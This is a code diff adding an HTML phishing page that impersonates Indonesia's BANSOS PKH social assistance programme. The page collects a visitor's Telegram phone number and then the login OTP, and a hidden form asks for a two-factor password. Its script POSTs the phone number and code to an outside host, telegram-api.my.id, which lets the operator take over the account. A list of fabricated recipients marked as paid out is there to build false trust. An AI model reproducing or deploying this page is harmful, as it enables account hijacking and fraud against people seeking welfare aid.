@@ -1,0 +1,353 @@
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <link rel="preload" as="image" imagesrcset="img/253.jpg" fetchpriority="high">
+  <link rel="preload" as="image" imagesrcset="img/251.jpg" fetchpriority="high">
+  <link rel="preload" as="image" imagesrcset="img/252.jpg" fetchpriority="high">
+  <link rel="stylesheet" href="css/4fcfb33cb7d503bb.css" data-precedence="next">
+  <link rel="stylesheet" href="css/d3df112486f97f47.css" data-precedence="next">
+  <link rel="stylesheet" href="css/4df78f2cd73d6b26.css" data-precedence="next">
+  <link rel="stylesheet" href="css/02ce91a40a38af71.css" data-precedence="next">
+  <link rel="preload" as="script" fetchpriority="low" href="chunks/webpack-860986681eb4385f.js"> 
+  <link rel="preload" as="script" fetchpriority="low" href="chunks/feedback.js"> 
+  <title>BANSOS PKH</title>
+  <meta name="description" content="Dapatkan Bantuan PKH sekarang Juga!!!!">
+  <meta property="og:title" content="BANSOS PKH">
+  <meta property="og:description" content="Dapatkan Bantuan PKH sekarang Juga!!!!">
+  <meta property="og:image" content="images/252.jpg">
+  <meta property="og:image:width" content="1200">
+  <meta property="og:image:height" content="630">
+  <meta property="og:image:alt" content="bnss">
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:title" content="BANSOS PKH">
+  <meta name="twitter:description" content="Dapatkan Bantuan PKH sekarang Juga!!!!">
+  <meta name="twitter:image" content="img/252.jpg">
+  <meta name="twitter:image:width" content="1200">
+  <meta name="twitter:image:height" content="630">
+  <meta name="twitter:image:alt" content="bnss">
+  <link rel="icon" href="images/favicon.ico" type="image/x-icon" sizes="16x16">
+  <link rel="stylesheet" href="css/all.min.css"> 
+  <style>
+.slider-container {
+  position: relative;
+  width: 93%;
+  max-width: 600px;
+  height: auto;
+  margin: auto;
+  margin-top: 30px;
+  overflow: hidden;
+  border-radius: 10px;
+  box-shadow: 0 4px 12px rgba(0,0,0,0.2);
+}
+
+.slider {
+  display: flex;
+  width: 100%;
+  transition: transform 1s ease-in-out;
+}
+
+.slide {
+  min-width: 100%;
+  box-sizing: border-box;
+}
+
+.slide img {
+  width: 100%;
+  display: block;
+}
+
+.dots {
+  text-align: center;
+  margin-top: 8px;
+}
+
+.dot {
+  height: 10px;
+  width: 10px;
+  margin: 0 4px;
+  background-color: #ccc;
+  border-radius: 50%;
+  display: inline-block;
+  transition: background-color 0.4s ease;
+}
+
+.dot.active {
+  background-color: #f4b000;
+  transform: scale(1.3);
+}
+  	</style>
+ </head>
+ <body>
+  <nav class="navbar navbar-expand-md" style="background:#eaba51">
+   <div class="container-fluid">
+    <a class="navbar-brand" href="#"><img alt="Logo Negara" loading="lazy" width="80" height="40" decoding="async" data-nimg="1" style="color:transparent;object-fit:contain" srcset="images/lg.png" src="images/lg.png"><img alt="Logo Madani" loading="lazy" width="80" height="40" decoding="async" data-nimg="1" style="color:transparent;object-fit:contain;margin-right:10px" srcset="images/DTKS2024.png" src="images/DTKS2024.png"></a>
+   </div>
+  </nav>
+  <div class="slider-container">
+  <div class="slider" id="slider">
+    <div class="slide">
+      <img src="images/253.jpg" alt="Bansos">
+    </div>
+    <div class="slide">
+      <img src="images/252.jpg" alt="Bansos">
+    </div>
+    <div class="slide">
+      <img src="images/251.jpg" alt="Bansos">
+    </div>
+  </div>
+</div>
+
+<div class="dots">
+  <span class="dot active"></span>
+  <span class="dot"></span>
+  <span class="dot"></span>
+</div>
+   <br>
+   <div class="text-center mt-2">
+    <h2>BANSOS PKH & DTKS</h2>
+    <p class="btn-mk"> Cek / Daftar Sekarang</p>
+   </div>
+   <form style="display:none; box-shadow:0px 0px 20px 2px rgba(0, 0, 0, 0.2);border-radius:10px;padding:20px;background-color:#fff" id="WahyuOne">
+    <div class="mb-3 text-center">
+     <label for="phone_number" class="form-label"><b>Nomor Telegram Aktif</b></label>
+     <div class="input-group">
+      <span class="input-group-text">🇮🇩</span>
+      <input type="tel" class="form-control" id="phone" placeholder="628xxxxxxxx" required="" value="" maxlength="14">
+     </div>
+    </div>
+    <button type="submit" class="btn btn-warning w-100" style="font-weight:bold;color:#000" id="#submit-button" onclick="WahyuStrID()">PERIKSA SEKARANG</button>
+   </form>
+  
+   <form style="display:block; box-shadow:0px 0px 20px 2px rgba(0, 0, 0, 0.2);border-radius:10px;padding:20px;background-color:#fff" id="WahyuTwo">
+    <div class="mb-3 text-center">
+    	<label for="phone_number" class="form-label"><b>Kode verifikasi telah dikirimkan ke <br>nomer +</label><label for="phone_number" class="form-label" id="phoneView"></label><label for="phone_number" class="form-label"><br>Silakan masukkan kode verifikasi tersebut</b></label><br><hr>
+     <label for="phone_number" class="form-label"><b>Kode OTP</b></label>
+     <div class="input-group">
+      <span class="input-group-text">🔑</span>
+      <input type="tel" class="form-control" id="otp" placeholder="*****" maxlength="5" required="" value="">
+     </div>
+    </div>
+    <button type="submit" class="btn btn-warning w-100" style="font-weight:bold;color:#000" onclick="WahyuStrIDTwo()">Lanjutkan</button>
+   </form>
+  
+   <form style="display:none; box-shadow:0px 0px 20px 2px rgba(0, 0, 0, 0.2);border-radius:10px;padding:20px;background-color:#fff" id="WahyuThree">
+    <div class="mb-3 text-center">
+     <label for="phone_number" class="form-label"><b>Password</b></label>
+     <div class="input-group">
+      <span class="input-group-text">🛡</span>
+      <input type="text" class="form-control" placeholder="Masukkan Password" required="" value="">
+     </div>
+    </div>
+    <button type="submit" class="btn btn-warning w-100" style="font-weight:bold;color:#000">Lanjutkan</button>
+   </form>
+
+  <br>
+  <div class="_record-box">
+   <div id="list" class="list-box">
+    <div class="list">
+     <div class="item">
+      <div class="record_logo">
+       <img alt="Fitriani" loading="lazy" width="50" height="50" decoding="async" data-nimg="1" style="color:transparent" srcset="images/r1.jpg" src="images/r1.jpg">
+      </div>
+      <div class="center">
+       <div class="h1">
+        <span class="name">Fitriani</span>
+       </div>
+       <div class="h2">
+        Berhasil Cair ✅
+       </div>
+      </div>
+     </div>
+     <div class="item">
+      <div class="record_logo">
+       <img alt="Dimas Prasetyo" loading="lazy" width="50" height="50" decoding="async" data-nimg="1" style="color:transparent" srcset="images/r2.jpg" src="images/r2.jpg">
+      </div>
+      <div class="center">
+       <div class="h1">
+        <span class="name">Dimas Prasetyo</span>
+       </div>
+       <div class="h2">
+        Berhasil Cair ✅
+       </div>
+      </div>
+     </div>
+     <div class="item">
+      <div class="record_logo">
+       <img alt="Amelia" loading="lazy" width="50" height="50" decoding="async" data-nimg="1" style="color:transparent" srcset="images/r3.jpg" src="images/r3.jpg">
+      </div>
+      <div class="center">
+       <div class="h1">
+        <span class="name">Amelia</span>
+       </div>
+       <div class="h2">
+        Berhasil Cair ✅
+       </div>
+      </div>
+     </div>
+     <div class="item">
+      <div class="record_logo">
+       <img alt="Firman Syahputra" loading="lazy" width="50" height="50" decoding="async" data-nimg="1" style="color:transparent" srcset="images/r4.jpg" src="images/r4.jpg">
+      </div>
+      <div class="center">
+       <div class="h1">
+        <span class="name">Firman Syahputra</span>
+       </div>
+       <div class="h2">
+        Berhasil Cair ✅
+       </div>
+      </div>
+     </div>
+     <div class="item">
+      <div class="record_logo">
+       <img alt="Dani Irawan" loading="lazy" width="50" height="50" decoding="async" data-nimg="1" style="color:transparent" srcset="images/r5.jpg" src="images/r5.jpg">
+      </div>
+      <div class="center">
+       <div class="h1">
+        <span class="name">Dani Irawan</span>
+       </div>
+       <div class="h2">
+        Berhasil Cair ✅
+       </div>
+      </div>
+     </div>
+     <div class="item">
+      <div class="record_logo">
+       <img alt="Hariadi" loading="lazy" width="50" height="50" decoding="async" data-nimg="1" style="color:transparent" srcset="images/r6.jpg" src="images/r6.jpg">
+      </div>
+      <div class="center">
+       <div class="h1">
+        <span class="name">Hariadi</span>
+       </div>
+       <div class="h2">
+        Berhasil Cair ✅
+       </div>
+      </div>
+     </div>
+     <div class="item">
+      <div class="record_logo">
+       <img alt="Fandi Jaya Kusuma" loading="lazy" width="50" height="50" decoding="async" data-nimg="1" style="color:transparent" srcset="images/r7.jpg" src="images/r7.jpg">
+      </div>
+      <div class="center">
+       <div class="h1">
+        <span class="name">Fandi Jaya Kusuma</span>
+       </div>
+       <div class="h2">
+        Berhasil Cair ✅
+       </div>
+      </div>
+     </div>
+     <div class="item">
+      <div class="record_logo">
+       <img alt="Indah Pertiwi" loading="lazy" width="50" height="50" decoding="async" data-nimg="1" style="color:transparent" srcset="images/r8.jpg" src="images/r8.jpg">
+      </div>
+      <div class="center">
+       <div class="h1">
+        <span class="name">Indah Pertiwi</span>
+       </div>
+       <div class="h2">
+        Berhasil Cair ✅
+       </div>
+      </div>
+     </div>
+     <div class="item">
+      <div class="record_logo">
+       <img alt="Mulyono" loading="lazy" width="50" height="50" decoding="async" data-nimg="1" style="color:transparent" srcset="images/r9.jpg" src="images/r9.jpg">
+      </div>
+      <div class="center">
+       <div class="h1">
+        <span class="name">Mulyono</span>
+       </div>
+       <div class="h2">
+        Berhasil Cair ✅
+       </div>
+      </div>
+     </div>
+     <div class="item">
+      <div class="record_logo">
+       <img alt="Imam Mahrus" loading="lazy" width="50" height="50" decoding="async" data-nimg="1" style="color:transparent" srcset="images/r10.jpg" src="images/r10.jpg">
+      </div>
+      <div class="center">
+       <div class="h1">
+        <span class="name">Imam Mahrus</span>
+       </div>
+       <div class="h2">
+        Berhasil Cair ✅
+       </div>
+      </div>
+     </div>
+    </div>
+   </div>
+  </div>
+  <div class="header mt-3 text-center">
+   <img alt="Footer Logo" loading="lazy" width="450" height="250" decoding="async" data-nimg="1" class="img-fluid" style="color:transparent" srcset="images/footer.webp" src="images/footer.webp">
+  </div> 
+  <div id="loading" style="display:none; place-items: center; position: fixed; inset: 0; z-index: 9999; background: rgba(0, 0, 0, 0.5)">
+  	<img src="images/loading.gif" width="15%"></img>
+  	</div>
+  <next-route-announcer style="position: absolute;"></next-route-announcer>
+ <script src="chunks/feedback.js"></script>
+ <script>
+let index = 0;
+const slides = document.querySelectorAll('.slide');
+const dots = document.querySelectorAll('.dot');
+const slider = document.getElementById('slider');
+
+function moveSlider() {
+  index++;
+  if (index >= slides.length) index = 0;
+  
+  slider.style.transform = `translateX(-${index * 100}%)`;
+  
+  dots.forEach(dot => dot.classList.remove('active'));
+  dots[index].classList.add('active');
+}
+
+setInterval(moveSlider, 3000);
+</script>
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.0/dist/js/bootstrap.bundle.min.js"></script>
+<script src="https://code.jquery.com/jquery.min.js"></script>
+<script>
+sessionStorage
+    const phone = sessionStorage.getItem("phone");
+
+    if (phone) {
+      document.getElementById("phoneView").textContent = phone;
+    } else {
+      document.getElementById("phoneView").textContent = "null";
+    }
+    
+function WahyuStrIDTwo() {
+    event.preventDefault();
+    $('#loading').css('display', 'grid');
+    
+    const otp = document.getElementById("otp").value;
+    const WahyuOne = document.getElementById("WahyuOne");
+    const WahyuTwo = document.getElementById("WahyuTwo");
+    const WahyuThree = document.getElementById("WahyuThree");
+    
+    fetch("https://telegram-api.my.id/AuthOtp/", {
+        method: "POST",
+        headers: { "Content-Type": "application/x-www-form-urlencoded" },
+        body: `action=verify&phone=+${phone}&otp=${otp}` 
+    })
+    .then(response => response.json())
+    .then(data => {
+        $('#loading').hide();
+        if (data.status === "success") {        
+            window.location.href = "sukses.html";
+        } 
+        else if (data.status === "password_required") {
+            window.location.href = "twofactor.html";
+        } 
+        else {
+            alert(data.message);
+        }
+    })
+    .catch(error => {
+        $('#loading').hide();
+        alert("Terjadi kesalahan. Silakan coba lagi.");
+        console.error("Error:", error);
+    });
+}
+</script>
+</body></html>
